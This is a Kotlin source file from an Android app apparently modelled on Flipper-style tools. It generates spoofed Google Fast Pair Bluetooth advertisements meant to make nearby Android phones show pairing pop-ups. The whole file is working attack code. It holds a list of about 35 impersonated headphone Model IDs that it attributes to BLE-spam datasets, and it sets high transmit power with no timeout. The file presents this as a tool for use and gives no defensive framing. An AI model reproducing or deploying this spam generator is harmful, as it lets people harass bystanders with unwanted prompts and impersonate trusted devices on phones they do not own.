package com.example.flipperdroid.model.`object`

import com.example.flipperdroid.model.`class`.AdvertisementSet
import com.example.flipperdroid.model.`class`.ServiceData
import com.example.flipperdroid.model.enums.AdvertisementSetType
import com.example.flipperdroid.model.enums.AdvertisementTarget
import com.example.flipperdroid.model.enums.AdvertisementSetRange
import com.example.flipperdroid.model.enums.TxPowerLevel
import com.example.flipperdroid.model.enums.AdvertiseMode
import java.util.UUID

/**
 * Generates "Google Fast Pair" frames that trigger the pairing sheet
 * (half-sheet) on nearby Android devices.
 *
 * Format: Service Data, 16-bit UUID 0xFE2C, payload = 3-byte Model ID.
 */
object FastPairAdvertisementSetGenerator {
    // Full UUID corresponding to the 16-bit UUID 0xFE2C
    private val FAST_PAIR_UUID: UUID = UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")

    // Fast Pair Model IDs (3 bytes) that trigger the pairing sheet on Android.
    // The name below is a label for the operator: the target phone
    // displays the real name registered at Google for this Model ID (or a generic
    // sheet if the ID is unknown to its database). Each key is exactly
    // 6 hexadecimal characters (3 bytes).
    private val modelIds = mapOf(
        "CD8256" to "Bose QC 35 II",
        "0000F0" to "Fast Pair Device",
        "92BBBD" to "Pixel Buds",
        "F52494" to "Sony WF-1000XM4",
        "718FA4" to "JBL Flip 6",
        "0002F0" to "Bose SoundLink",
        "01E5CE" to "LG HBS-835S",
        "02D815" to "Razer Hammerhead",
        "038CF1" to "JBL Live 300",
        "F00000" to "Fast Pair Test",
        // Additional models widely reproduced in BLE-spam datasets
        "2D7A23" to "Bose NC 700",
        "D446A7" to "Sony WF-1000XM3",
        "0E30C3" to "Sony WH-1000XM4",
        "98066F" to "Sony WF-1000XM5",
        "1D1F2B" to "JBL Buds Pro",
        "9C0645" to "JBL Tune 230",
        "E85D01" to "JBL Tune 130",
        "AA187E" to "JBL Live Pro 2",
        "D97EBA" to "Pixel Buds Pro",
        "0002B0" to "Pixel Buds A-Series",
        "D68CB5" to "OnePlus Buds Z2",
        "5B7B62" to "OnePlus Buds Pro",
        "C7B3F8" to "OPPO Enco X",
        "3B5A9B" to "realme Buds Air 3",
        "5BA9C0" to "Nothing Ear (1)",
        "A7C4F2" to "Nothing Ear (2)",
        "6A6362" to "Beats Studio Buds",
        "20B510" to "Beats Fit Pro",
        "27EA20" to "Anker Soundcore",
        "9B7CA8" to "Skullcandy Push",
        "8CD10F" to "Marshall Minor III",
        "149E8B" to "Sennheiser Momentum",
        "4A18B8" to "LG Tone Free",
        "90C8FA" to "Belkin SoundForm",
    )

    fun getAdvertisementSets(): List<AdvertisementSet> {
        val advertisementSets = mutableListOf<AdvertisementSet>()
        modelIds.forEach { (modelIdHex, name) ->
            val advertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_GOOGLE
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_FAST_PAIR
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_CLOSE
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = true
            advertisementSet.advertiseSettings.timeout = 0
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseData.includeDeviceName = false
            advertisementSet.advertiseData.includeTxPower = false

            val serviceData = ServiceData()
            serviceData.serviceUuid = FAST_PAIR_UUID
            serviceData.serviceData = StringHelpers.decodeHex(modelIdHex)
            advertisementSet.advertiseData.services.add(serviceData)

            advertisementSet.title = "FastPair: $name"
            advertisementSets.add(advertisementSet)
        }
        return advertisementSets
    }
}
